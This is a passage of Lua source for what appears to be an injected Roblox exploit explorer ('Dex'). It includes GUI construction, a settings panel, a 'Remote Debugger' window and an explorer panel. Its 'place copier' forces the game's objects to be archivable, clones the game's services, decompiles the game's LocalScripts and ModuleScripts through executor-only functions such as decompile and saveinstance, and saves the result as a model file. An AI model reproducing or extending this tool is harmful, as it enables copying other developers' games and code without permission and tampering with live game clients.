NewGuiPart128.Text = "Camera Instances"
NewGuiPart128.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart129.Name = "Status"
NewGuiPart129.Parent = NewGuiPart127
NewGuiPart129.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart129.BackgroundTransparency = 1
NewGuiPart129.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart129.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart129.Font = Enum.Font.SourceSans
NewGuiPart129.FontSize = Enum.FontSize.Size18
NewGuiPart129.Text = "Off"
NewGuiPart129.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart130.Name = "Change"
NewGuiPart130.Parent = NewGuiPart127
NewGuiPart130.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart130.BorderSizePixel = 0
NewGuiPart130.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart130.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart130.Font = Enum.Font.SourceSans
NewGuiPart130.FontSize = Enum.FontSize.Size14
NewGuiPart130.Text = ""

NewGuiPart131.Name = "OnBar"
NewGuiPart131.Parent = NewGuiPart130
NewGuiPart131.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart131.BorderSizePixel = 0
NewGuiPart131.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart131.Font = Enum.Font.SourceSans
NewGuiPart131.FontSize = Enum.FontSize.Size14
NewGuiPart131.Text = ""

NewGuiPart132.Name = "Bar"
NewGuiPart132.Parent = NewGuiPart130
NewGuiPart132.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart132.BorderSizePixel = 0
NewGuiPart132.ClipsDescendants = true
NewGuiPart132.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart132.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart132.Font = Enum.Font.SourceSans
NewGuiPart132.FontSize = Enum.FontSize.Size14
NewGuiPart132.Text = ""

NewGuiPart133.Name = "Scripts"
NewGuiPart133.Parent = NewGuiPart114
NewGuiPart133.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart133.BackgroundTransparency = 1
NewGuiPart133.Size = UDim2.new(1, 0, 0, 60)

NewGuiPart134.Name = "SName"
NewGuiPart134.Parent = NewGuiPart133
NewGuiPart134.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart134.BackgroundTransparency = 1
NewGuiPart134.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart134.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart134.Font = Enum.Font.SourceSans
NewGuiPart134.FontSize = Enum.FontSize.Size18
NewGuiPart134.Text = "Save Scripts"
NewGuiPart134.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart135.Name = "Status"
NewGuiPart135.Parent = NewGuiPart133
NewGuiPart135.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart135.BackgroundTransparency = 1
NewGuiPart135.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart135.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart135.Font = Enum.Font.SourceSans
NewGuiPart135.FontSize = Enum.FontSize.Size18
NewGuiPart135.Text = "Off"
NewGuiPart135.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart136.Name = "Change"
NewGuiPart136.Parent = NewGuiPart133
NewGuiPart136.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart136.BorderSizePixel = 0
NewGuiPart136.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart136.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart136.Font = Enum.Font.SourceSans
NewGuiPart136.FontSize = Enum.FontSize.Size14
NewGuiPart136.Text = ""

NewGuiPart137.Name = "OnBar"
NewGuiPart137.Parent = NewGuiPart136
NewGuiPart137.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart137.BorderSizePixel = 0
NewGuiPart137.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart137.Font = Enum.Font.SourceSans
NewGuiPart137.FontSize = Enum.FontSize.Size14
NewGuiPart137.Text = ""

NewGuiPart138.Name = "Bar"
NewGuiPart138.Parent = NewGuiPart136
NewGuiPart138.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart138.BorderSizePixel = 0
NewGuiPart138.ClipsDescendants = true
NewGuiPart138.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart138.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart138.Font = Enum.Font.SourceSans
NewGuiPart138.FontSize = Enum.FontSize.Size14
NewGuiPart138.Text = ""

NewGuiPart139.Name = "ToSave"
NewGuiPart139.Parent = NewGuiPart111
NewGuiPart139.BackgroundTransparency = 1
NewGuiPart139.Position = UDim2.new(0, 0, 0, 17)
NewGuiPart139.Size = UDim2.new(1, 0, 0, 20)
NewGuiPart139.Font = Enum.Font.SourceSans
NewGuiPart139.FontSize = Enum.FontSize.Size18
NewGuiPart139.Text = "To Save"
NewGuiPart139.TextColor3 = Color3.new(0, 0, 0)

NewGuiPart140.Name = "CopyList"
NewGuiPart140.Parent = NewGuiPart111
NewGuiPart140.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart140.BackgroundTransparency = 0.80000001192093
NewGuiPart140.Position = UDim2.new(0, 0, 0, 37)
NewGuiPart140.Size = UDim2.new(1, 0, 0, 163)

NewGuiPart141.Name = "Bottom"
NewGuiPart141.Parent = NewGuiPart111
NewGuiPart141.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart141.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart141.Position = UDim2.new(0, 0, 1, -50)
NewGuiPart141.Size = UDim2.new(1, 0, 0, 50)

NewGuiPart142.Parent = NewGuiPart141
NewGuiPart142.BackgroundTransparency = 1
NewGuiPart142.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart142.Size = UDim2.new(1, -4, 1, 0)
NewGuiPart142.Font = Enum.Font.SourceSans
NewGuiPart142.FontSize = Enum.FontSize.Size14
NewGuiPart142.Text = "After the map saves, open a new place on studio, then right click Lighting and \"Insert from file...\", then select your file and run the unpacker script inside the folder."
NewGuiPart142.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart142.TextWrapped = true
NewGuiPart142.TextXAlignment = Enum.TextXAlignment.Left
NewGuiPart142.TextYAlignment = Enum.TextYAlignment.Top

NewGuiPart143.Name = "Save"
NewGuiPart143.Parent = NewGuiPart111
NewGuiPart143.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
NewGuiPart143.BackgroundTransparency = 0.80000001192093
NewGuiPart143.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart143.Position = UDim2.new(0, 0, 1, -80)
NewGuiPart143.Size = UDim2.new(1, 0, 0, 30)
NewGuiPart143.Font = Enum.Font.SourceSans
NewGuiPart143.FontSize = Enum.FontSize.Size18
NewGuiPart143.Text = "Save"

NewGuiPart144.Name = "FileName"
NewGuiPart144.Parent = NewGuiPart111
NewGuiPart144.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
NewGuiPart144.BackgroundTransparency = 0.60000002384186
NewGuiPart144.Position = UDim2.new(0, 0, 1, -105)
NewGuiPart144.Size = UDim2.new(1, 0, 0, 25)
NewGuiPart144.Font = Enum.Font.SourceSans
NewGuiPart144.FontSize = Enum.FontSize.Size18
NewGuiPart144.Text = "PlaceName"
NewGuiPart144.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart145.Name = "Entry"
NewGuiPart145.Parent = NewGuiPart111
NewGuiPart145.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart145.BackgroundTransparency = 1
NewGuiPart145.Size = UDim2.new(1, 0, 0, 22)
NewGuiPart145.Visible = false

NewGuiPart146.Name = "Change"
NewGuiPart146.Parent = NewGuiPart145
NewGuiPart146.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart146.BackgroundTransparency = 0.60000002384186
NewGuiPart146.Position = UDim2.new(0, 10, 0, 1)
NewGuiPart146.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart146.ZIndex = 2
NewGuiPart146.Font = Enum.Font.SourceSans
NewGuiPart146.FontSize = Enum.FontSize.Size18
NewGuiPart146.Text = ""
NewGuiPart146.TextColor3 = Color3.new(1, 1, 1)

NewGuiPart147.Name = "enabled"
NewGuiPart147.Parent = NewGuiPart146
NewGuiPart147.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
NewGuiPart147.BackgroundTransparency = 0.40000000596046
NewGuiPart147.BorderSizePixel = 0
NewGuiPart147.Position = UDim2.new(0, 3, 0, 3)
NewGuiPart147.Size = UDim2.new(0, 14, 0, 14)
NewGuiPart147.Font = Enum.Font.SourceSans
NewGuiPart147.FontSize = Enum.FontSize.Size14
NewGuiPart147.Text = ""

NewGuiPart148.Name = "Info"
NewGuiPart148.Parent = NewGuiPart145
NewGuiPart148.BackgroundTransparency = 1
NewGuiPart148.Position = UDim2.new(0, 40, 0, 0)
NewGuiPart148.Size = UDim2.new(1, -40, 0, 22)
NewGuiPart148.Font = Enum.Font.SourceSans
NewGuiPart148.FontSize = Enum.FontSize.Size18
NewGuiPart148.Text = "Workspace"
NewGuiPart148.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart148.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart149.Name = "RemoteDebugWindow"
NewGuiPart149.Parent = NewGuiPart1
NewGuiPart149.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart149.BackgroundTransparency = 0.10000000149012
NewGuiPart149.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart149.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart149.Size = UDim2.new(0, 300, 1, 0)

NewGuiPart161.Name = "GetSetting"
NewGuiPart161.Parent = NewGuiPart149
NewGuiPart161.Archivable = true

NewGuiPart150.Name = "Header"
NewGuiPart150.Parent = NewGuiPart149
NewGuiPart150.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart150.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart150.Size = UDim2.new(1, 0, 0, 17)

NewGuiPart151.Parent = NewGuiPart150
NewGuiPart151.BackgroundTransparency = 1
NewGuiPart151.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart151.Size = UDim2.new(1, -4, 1, 0)
NewGuiPart151.Font = Enum.Font.SourceSans
NewGuiPart151.FontSize = Enum.FontSize.Size14
NewGuiPart151.Text = "Remote Debugger"
NewGuiPart151.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart151.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart152.Name = "Desc"
NewGuiPart152.Parent = NewGuiPart149
NewGuiPart152.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart152.BackgroundTransparency = 1
NewGuiPart152.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart152.Size = UDim2.new(1, 0, 0, 40)
NewGuiPart152.Font = Enum.Font.SourceSans
NewGuiPart152.FontSize = Enum.FontSize.Size32
NewGuiPart152.Text = "Have fun with remotes"
NewGuiPart152.TextWrapped = true
return NewGuiPart1
end
local D_E_X = CreateGui()
D_E_X.Parent = game.Players.LocalPlayer.PlayerGui
spawn(function()
	local Gui = D_E_X
	

local IntroFrame = Gui:WaitForChild("IntroFrame")

local SideMenu = Gui:WaitForChild("SideMenu")
local OpenToggleButton = Gui:WaitForChild("Toggle")
local CloseToggleButton = SideMenu:WaitForChild("Toggle")
local OpenScriptEditorButton = SideMenu:WaitForChild("OpenScriptEditor")

local ScriptEditor = Gui:WaitForChild("ScriptEditor")

local SlideOut = SideMenu:WaitForChild("SlideOut")
local SlideFrame = SlideOut:WaitForChild("SlideFrame")
local Slant = SideMenu:WaitForChild("Slant")

local ExplorerButton = SlideFrame:WaitForChild("Explorer")
local SettingsButton = SlideFrame:WaitForChild("Settings")

local SelectionBox = Instance.new("SelectionBox")
SelectionBox.Parent = Gui

local ExplorerPanel = Gui:WaitForChild("ExplorerPanel")
local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
local SaveMapWindow = Gui:WaitForChild("SaveMapWindow")
local RemoteDebugWindow = Gui:WaitForChild("RemoteDebugWindow")

local SettingsPanel = Gui:WaitForChild("SettingsPanel")
local SettingsListener = SettingsPanel:WaitForChild("GetSetting")
local SettingTemplate = SettingsPanel:WaitForChild("SettingTemplate")
local SettingList = SettingsPanel:WaitForChild("SettingList")

local SaveMapCopyList = SaveMapWindow:WaitForChild("CopyList")
local SaveMapSettingFrame = SaveMapWindow:WaitForChild("MapSettings")
local SaveMapName = SaveMapWindow:WaitForChild("FileName")
local SaveMapButton = SaveMapWindow:WaitForChild("Save")
local SaveMapCopyTemplate = SaveMapWindow:WaitForChild("Entry")
local SaveMapSettings = {
	CopyWhat = {
		Workspace = true,
		Lighting = true,
		ReplicatedStorage = true,
		ReplicatedFirst = true,
		StarterPack = true,
		StarterGui = true,
		StarterPlayer = true
	},
	SaveScripts = true,
	SaveTerrain = true,
	LightingProperties = true,
	CameraInstances = true
}

local SelectionChanged = ExplorerPanel:WaitForChild("SelectionChanged")
local GetSelection = ExplorerPanel:WaitForChild("GetSelection")
local SetSelection = ExplorerPanel:WaitForChild("SetSelection")

local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()

local CurrentWindow = "Nothing c:"
local Windows = {
	Explorer = {
		ExplorerPanel,
		PropertiesFrame
	},
	Settings = {SettingsPanel},
	SaveMap = {SaveMapWindow},
	Remotes = {RemoteDebugWindow}
}

function switchWindows(wName,over)
	if CurrentWindow == wName and not over then return end
	
	local count = 0
	
	for i,v in pairs(Windows) do
		count = 0
		if i ~= wName then
			for _,c in pairs(v) do c:TweenPosition(UDim2.new(1, 30, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
		end
	end
	
	count = 0
	
	if Windows[wName] then
		for _,c in pairs(Windows[wName]) do c:TweenPosition(UDim2.new(1, -300, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
	end
	
	if wName ~= "Nothing c:" then
		CurrentWindow = wName
		for i,v in pairs(SlideFrame:GetChildren()) do
			v.BackgroundTransparency = 1
			v.Icon.ImageColor3 = Color3.new(70/255, 70/255, 70/255)
		end
		if SlideFrame:FindFirstChild(wName) then
			SlideFrame[wName].BackgroundTransparency = 0.5
			SlideFrame[wName].Icon.ImageColor3 = Color3.new(0,0,0)
		end
	end
end

function toggleDex(on)
	if on then
		SideMenu:TweenPosition(UDim2.new(1, -330, 0, 0), "Out", "Quad", 0.5, true)
		OpenToggleButton:TweenPosition(UDim2.new(1,0,0,0), "Out", "Quad", 0.5, true)
		switchWindows(CurrentWindow,true)
	else
		SideMenu:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", 0.5, true)
		OpenToggleButton:TweenPosition(UDim2.new(1,-30,0,0), "Out", "Quad", 0.5, true)
		switchWindows("Nothing c:")
	end
end

local Settings = {
	ClickSelect = false,
	SelBox = false,
	ClearProps = false,
	SelectUngrouped = true,
	SaveInstanceScripts = true
}

function ReturnSetting(set)
	if set == "ClearProps" then
		return Settings.ClearProps
	elseif set == "SelectUngrouped" then
		return Settings.SelectUngrouped
	end
end

OpenToggleButton.MouseButton1Up:connect(function()
	toggleDex(true)
end)

OpenScriptEditorButton.MouseButton1Up:connect(function()
	if OpenScriptEditorButton.Active then
		ScriptEditor.Visible = true
	end
end)

CloseToggleButton.MouseButton1Up:connect(function()
	if CloseToggleButton.Active then
		toggleDex(false)
	end
end)

for i,v in pairs(SlideFrame:GetChildren()) do
	v.MouseButton1Click:connect(function()
		switchWindows(v.Name)
	end)
	
	v.MouseEnter:connect(function()v.BackgroundTransparency = 0.5 end)
	v.MouseLeave:connect(function()if CurrentWindow~=v.Name then v.BackgroundTransparency = 1 end end)
end


function createSetting(name,interName,defaultOn)
	local newSetting = SettingTemplate:Clone()
	newSetting.Position = UDim2.new(0,0,0,#SettingList:GetChildren() * 60)
	newSetting.SName.Text = name
	
	local function toggle(on)
		if on then
			newSetting.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Status.Text = "On"
			Settings[interName] = true
		else
			newSetting.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Status.Text = "Off"
			Settings[interName] = false
		end
	end	
	
	newSetting.Change.MouseButton1Click:connect(function()
		toggle(not Settings[interName])
	end)
	
	newSetting.Visible = true
	newSetting.Parent = SettingList
	
	if defaultOn then
		toggle(true)
	end
end

createSetting("Click part to select","ClickSelect",false)
createSetting("Selection Box","SelBox",false)
createSetting("Clear property value on focus","ClearProps",false)
createSetting("Select ungrouped models","SelectUngrouped",true)
createSetting("SaveInstance decompiles scripts","SaveInstanceScripts",true)

local function getSelection()
	local t = GetSelection:Invoke()
	if t and #t > 0 then
		return t[1]
	else
		return nil
	end
end

Mouse.Button1Down:connect(function()
	if CurrentWindow == "Explorer" and Settings.ClickSelect then
		local target = Mouse.Target
		if target then
			SetSelection:Invoke({target})
		end
	end
end)

SelectionChanged.Event:connect(function()
	if Settings.SelBox then
		local success,err = pcall(function()
			local selection = getSelection()
			SelectionBox.Adornee = selection
		end)
		if err then
			SelectionBox.Adornee = nil
		end
	end
end)

SettingsListener.OnInvoke = ReturnSetting

-- Map Copier

function createMapSetting(obj,interName,defaultOn)
	local function toggle(on)
		if on then
			obj.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Status.Text = "On"
			SaveMapSettings[interName] = true
		else
			obj.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Status.Text = "Off"
			SaveMapSettings[interName] = false
		end
	end	
	
	obj.Change.MouseButton1Click:connect(function()
		toggle(not SaveMapSettings[interName])
	end)
	
	obj.Visible = true
	obj.Parent = SaveMapSettingFrame
	
	if defaultOn then
		toggle(true)
	end
end

function createCopyWhatSetting(serv)
	if SaveMapSettings.CopyWhat[serv] then
		local newSetting = SaveMapCopyTemplate:Clone()
		newSetting.Position = UDim2.new(0,0,0,#SaveMapCopyList:GetChildren() * 22 + 5)
		newSetting.Info.Text = serv
		
		local function toggle(on)
			if on then
				newSetting.Change.enabled.Visible = true
				SaveMapSettings.CopyWhat[serv] = true
			else
				newSetting.Change.enabled.Visible = false
				SaveMapSettings.CopyWhat[serv] = false
			end
		end	
	
		newSetting.Change.MouseButton1Click:connect(function()
			toggle(not SaveMapSettings.CopyWhat[serv])
		end)
		
		newSetting.Visible = true
		newSetting.Parent = SaveMapCopyList
	end
end

createMapSetting(SaveMapSettingFrame.Scripts,"SaveScripts",true)
createMapSetting(SaveMapSettingFrame.Terrain,"SaveTerrain",true)
createMapSetting(SaveMapSettingFrame.Lighting,"LightingProperties",true)
createMapSetting(SaveMapSettingFrame.CameraInstances,"CameraInstances",true)

createCopyWhatSetting("Workspace")
createCopyWhatSetting("Lighting")
createCopyWhatSetting("ReplicatedStorage")
createCopyWhatSetting("ReplicatedFirst")
createCopyWhatSetting("StarterPack")
createCopyWhatSetting("StarterGui")
createCopyWhatSetting("StarterPlayer")

SaveMapName.Text = tostring(game.PlaceId).."MapCopy"

SaveMapButton.MouseButton1Click:connect(function()
	local copyWhat = {}

	local copyGroup = Instance.new("Model",game.ReplicatedStorage)

	local copyScripts = SaveMapSettings.SaveScripts

	local copyTerrain = SaveMapSettings.SaveTerrain

	local lightingProperties = SaveMapSettings.LightingProperties

	local cameraInstances = SaveMapSettings.CameraInstances

	-----------------------------------------------------------------------------------

	for i,v in pairs(SaveMapSettings.CopyWhat) do
		if v then
			table.insert(copyWhat,i)
		end
	end

	local consoleFunc = printconsole or writeconsole

	if consoleFunc then
		consoleFunc("Raspberry Pi's place copier loaded.")
		consoleFunc("Copying map of game "..tostring(game.PlaceId)..".")
	end

	function archivable(root)
		for i,v in pairs(root:GetChildren()) do
			if not game.Players:GetPlayerFromCharacter(v) then
				v.Archivable = true
				archivable(v)
			end
		end
	end

	function decompileS(root)
		for i,v in pairs(root:GetChildren()) do
			pcall(function()
				if v:IsA("LocalScript") then
					local isDisabled = v.Disabled
					v.Disabled = true
					v.Source = decompile(v)
					v.Disabled = isDisabled
				
					if v.Source == "" then 
						if consoleFunc then consoleFunc("LocalScript "..v.Name.." had a problem decompiling.") end
					else
						if consoleFunc then consoleFunc("LocalScript "..v.Name.." decompiled.") end
					end
				elseif v:IsA("ModuleScript") then
					v.Source = decompile(v)
				
					if v.Source == "" then 
						if consoleFunc then consoleFunc("ModuleScript "..v.Name.." had a problem decompiling.") end
					else
						if consoleFunc then consoleFunc("ModuleScript "..v.Name.." decompiled.") end
					end
				end
			end)
			decompileS(v)
		end
	end

	for i,v in pairs(copyWhat) do archivable(game[v]) end

	for j,obj in pairs(copyWhat) do
		if obj ~= "StarterPlayer" then
			local newFolder = Instance.new("Folder",copyGroup)
			newFolder.Name = obj
			for i,v in pairs(game[obj]:GetChildren()) do
				if v ~= copyGroup then
					pcall(function()
						v:Clone().Parent = newFolder
					end)
				end
			end
		else
			local newFolder = Instance.new("Model",copyGroup)
			newFolder.Name = "StarterPlayer"
			for i,v in pairs(game[obj]:GetChildren()) do
				local newObj = Instance.new("Folder",newFolder)
				newObj.Name = v.Name
				for _,c in pairs(v:GetChildren()) do
					if c.Name ~= "ControlScript" and c.Name ~= "CameraScript" then
						c:Clone().Parent = newObj
					end
				end
			end
		end
	end

	if workspace.CurrentCamera and cameraInstances then
		local cameraFolder = Instance.new("Model",copyGroup)
		cameraFolder.Name = "CameraItems"
		for i,v in pairs(workspace.CurrentCamera:GetChildren()) do v:Clone().Parent = cameraFolder end
	end

	if copyTerrain then
		local myTerrain = workspace.Terrain:CopyRegion(workspace.Terrain.MaxExtents)
		myTerrain.Parent = copyGroup
	end

	function saveProp(obj,prop,par)
		local myProp = obj[prop]
		if type(myProp) == "boolean" then
			local newProp = Instance.new("BoolValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "number" then
			local newProp = Instance.new("IntValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "string" then
			local newProp = Instance.new("StringValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "userdata" then -- Assume Color3
			pcall(function()
				local newProp = Instance.new("Color3Value",par)
				newProp.Name = prop
				newProp.Value = myProp
			end)
		end
	end

	if lightingProperties then
		local lightingProps = Instance.new("Model",copyGroup)
		lightingProps.Name = "LightingProperties"
	
		saveProp(game.Lighting,"Ambient",lightingProps)
		saveProp(game.Lighting,"Brightness",lightingProps)
		saveProp(game.Lighting,"ColorShift_Bottom",lightingProps)
		saveProp(game.Lighting,"ColorShift_Top",lightingProps)
		saveProp(game.Lighting,"GlobalShadows",lightingProps)
		saveProp(game.Lighting,"OutdoorAmbient",lightingProps)
		saveProp(game.Lighting,"Outlines",lightingProps)
		saveProp(game.Lighting,"GeographicLatitude",lightingProps)
		saveProp(game.Lighting,"TimeOfDay",lightingProps)
		saveProp(game.Lighting,"FogColor",lightingProps)
		saveProp(game.Lighting,"FogEnd",lightingProps)
		saveProp(game.Lighting,"FogStart",lightingProps)
	end

	if decompile and copyScripts then
		decompileS(copyGroup)
	end

	if SaveInstance then
		SaveInstance(copyGroup,SaveMapName.Text..".rbxm")
	elseif saveinstance then
		saveinstance(getelysianpath()..SaveMapName.Text..".rbxm",copyGroup)
	end
	--print("Saved!")
	if consoleFunc then
		consoleFunc("The map has been copied.")
	end
	SaveMapButton.Text = "The map has been saved"
	wait(5)
	SaveMapButton.Text = "Save"
end)

-- End Copier

wait()

IntroFrame:TweenPosition(UDim2.new(1,-300,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

switchWindows("Explorer")

wait(1)

SideMenu.Visible = true

for i = 0,1,0.1 do
	IntroFrame.BackgroundTransparency = i
	IntroFrame.Main.BackgroundTransparency = i
	IntroFrame.Slant.ImageTransparency = i
	IntroFrame.Title.TextTransparency = i
	IntroFrame.Version.TextTransparency = i
	IntroFrame.Creator.TextTransparency = i
	wait()
end

IntroFrame.Visible = false

SlideFrame:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
OpenScriptEditorButton:TweenPosition(UDim2.new(0,0,0,180),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
CloseToggleButton:TweenPosition(UDim2.new(0,0,0,210),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
Slant:TweenPosition(UDim2.new(0,0,0,240),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

wait(0.5)

for i = 1,0,-0.1 do
	OpenScriptEditorButton.Icon.ImageTransparency = i
	CloseToggleButton.TextTransparency = i
	wait()
end

CloseToggleButton.Active = true
CloseToggleButton.AutoButtonColor = true

OpenScriptEditorButton.Active = true
OpenScriptEditorButton.AutoButtonColor = true
end)
spawn(function()
	-- initial states
local Option = {
	-- can modify object parents in the hierarchy
	Modifiable = false;
	-- can select objects
	Selectable = true;
}

-- MERELY

Option.Modifiable = true

-- END MERELY

-- general size of GUI objects, in pixels
local GUI_SIZE = 16
-- padding between items within each entry
local ENTRY_PADDING = 1
-- padding between each entry
local ENTRY_MARGIN = 1

local Input = game:GetService("UserInputService")
local HoldingCtrl = false
local HoldingShift = false

--[[

# Explorer Panel

A GUI panel that displays the game hierarchy.


## Selection Bindables

- `Function GetSelection ( )`

	Returns an array of objects representing the objects currently
	selected in the panel.

- `Function SetSelection ( Objects selection )`

	Sets the objects that are selected in the panel. `selection` is an array
	of objects.

- `Event SelectionChanged ( )`

	Fired after the selection changes.


## Option Bindables

- `Function GetOption ( string optionName )`

	If `optionName` is given, returns the value of that option. Otherwise,
	returns a table of options and their current values.

- `Function SetOption ( string optionName, bool value )`

	Sets `optionName` to `value`.

	Options:

	- Modifiable

		Whether objects can be modified by the panel.

		Note that modifying objects depends on being able to select them. If
		Selectable is false, then Actions will not be available. Reparenting
		is still possible, but only for the dragged object.

	- Selectable

		Whether objects can be selected.

		If Modifiable is false, then left-clicking will perform a drag
		selection.

## Updates

- 2013-09-18
	- Fixed explorer icons to match studio explorer.

- 2013-09-14
	- Added GetOption and SetOption bindables.
		- Option: Modifiable; sets whether objects can be modified by the panel.
		- Option: Selectable; sets whether objects can be selected.
	- Slight modification to left-click selection behavior.
	- Improved layout and scaling.

- 2013-09-13
	- Added drag to reparent objects.
		- Left-click to select/deselect object.
		- Left-click and drag unselected object to reparent single object.
		- Left-click and drag selected object to move reparent entire selection.
		- Right-click while dragging to cancel.

- 2013-09-11
	- Added explorer panel header with actions.
		- Added Cut action.
		- Added Copy action.
		- Added Paste action.
		- Added Delete action.
	- Added drag selection.
		- Left-click: Add to selection on drag.
		- Right-click: Add to or remove from selection on drag.
	- Ensured SelectionChanged fires only when the selection actually changes.
	- Added documentation and change log.
	- Fixed thread issue.

- 2013-09-09
	- Added basic multi-selection.
		- Left-click to set selection.
		- Right-click to add to or remove from selection.
	- Removed "Selection" ObjectValue.
		- Added GetSelection BindableFunction.
		- Added SetSelection BindableFunction.
		- Added SelectionChanged BindableEvent.
	- Changed font to SourceSans.

- 2013-08-31
	- Improved GUI sizing based off of `GUI_SIZE` constant.
	- Automatic font size detection.

- 2013-08-27
	- Initial explorer panel.


## Todo

- Sorting
	- by ExplorerOrder
	- by children
	- by name
- Drag objects to reparent

]]

local ENTRY_SIZE = GUI_SIZE + ENTRY_PADDING*2
local ENTRY_BOUND = ENTRY_SIZE + ENTRY_MARGIN
local HEADER_SIZE = ENTRY_SIZE*2

local FONT = 'SourceSans'
local FONT_SIZE do
	local size = {8,9,10,11,12,14,18,24,36,48}
	local s
	local n = math.huge
	for i = 1,#size do
		if size[i] <= GUI_SIZE then
			FONT_SIZE = i - 1
		end
	end
end

local GuiColor = {
	Background      = Color3.new(233/255, 233/255, 233/255);
	Border          = Color3.new(149/255, 149/255, 149/255);
	Selected        = Color3.new( 96/255, 140/255, 211/255);
	BorderSelected  = Color3.new( 86/255, 125/255, 188/255);
	Text            = Color3.new(  0/255,   0/255,   0/255);
	TextDisabled    = Color3.new(128/255, 128/255, 128/255);
	TextSelected    = Color3.new(255/255, 255/255, 255/255);
	Button          = Color3.new(221/255, 221/255, 221/255);
	ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
	ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
	Field           = Color3.new(255/255, 255/255, 255/255);
	FieldBorder     = Color3.new(191/255, 191/255, 191/255);
	TitleBackground = Color3.new(178/255, 178/255, 178/255);
}

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Icon map constants

local MAP_ID = 483448923

-- Indices based on implementation of Icon function.
local ACTION_CUT         	 = 160
local ACTION_COPY        	 = 161
local ACTION_PASTE       	 = 162
local ACTION_DELETE      	 = 163
